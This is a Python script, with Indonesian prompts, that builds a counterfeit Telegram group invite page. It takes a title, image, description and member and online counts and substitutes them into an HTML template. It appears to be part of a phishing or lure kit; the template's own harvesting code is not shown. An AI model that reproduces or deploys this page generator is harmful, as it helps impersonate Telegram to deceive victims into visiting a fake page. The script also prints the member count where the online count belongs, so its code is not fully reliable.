#!/usr/bin/env python3

import os
import shutil
import utils

a = "\033[1;30m"
m = "\033[1;31m"
p = "\033[1;37m"
r = "\033[0m"
h = "\033[1;32m"
W = ""

title = os.getenv('TITLE')
image = os.getenv('IMAGE')
desc = os.getenv('DESC')
mem_num = os.getenv('MEM_NUM')
online_num = os.getenv('ONLINE_NUM')

if title is None:
    title = input(f'\n{a}[{m}?{a}] {p}Nama Group{m} :{a} ')
else:
    utils.print(f'{a}[{m}?{a}] {p}Nama Group {m}:{a} '+title)

if image is None:
    image = input(f'{a}[{m}?{a}] {p}Path Ke Gambar Group {a}({p}Best Size {m}:{p} 300{m}x{p}300{a}) {m}:{a} ')
else:
    utils.print(f'{a}[{m}?{a}] {p}Gambar{m} :{a} '+image)

if desc is None:
    desc = input(f'{a}[{m}?{a}] {p}Deskripsi Group {m}:{a} ')
else:
    utils.print(f'{a}[{m}?{a}] {p}Deskripsi Group{m} :{a} '+desc)

if mem_num is None:
    mem_num = input(f'{a}[{m}?{a}] {p}Jumlah Anggota {m}:{a} ' + W)
else:
    utils.print(f'{a}[{m}?{a}] {p}Jumlah Anggota :{a} '+mem_num)

if online_num is None:
    online_num = input(f'{a}[{m}?{a}]{p} Jumlah Member Online {m}:{a} ')
else:
    utils.print(f'{a}[{m}?{a}] {p}Jumlah Member Online {m}:{a} '+mem_num)

img_name = utils.downloadImageFromUrl(image, 'template/telegram/images/')
if img_name :
    img_name = img_name.split('/')[-1]
else:
    img_name = image.split('/')[-1]
    try:
        shutil.copyfile(image, 'template/telegram/images/{}'.format(img_name))
    except Exception as e:
        utils.print(f'\n' + a + '[{m}-{a}]' + p + ' Exception {m}:{a} ' + W + str(e))
        exit()

with open('template/telegram/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP"):
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('$DESC$', desc)
    code = code.replace('$MEMBERS$', mem_num)
    code = code.replace('$ONLINE$', online_num)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/telegram/index.html', 'w') as new_index:
    new_index.write(code)
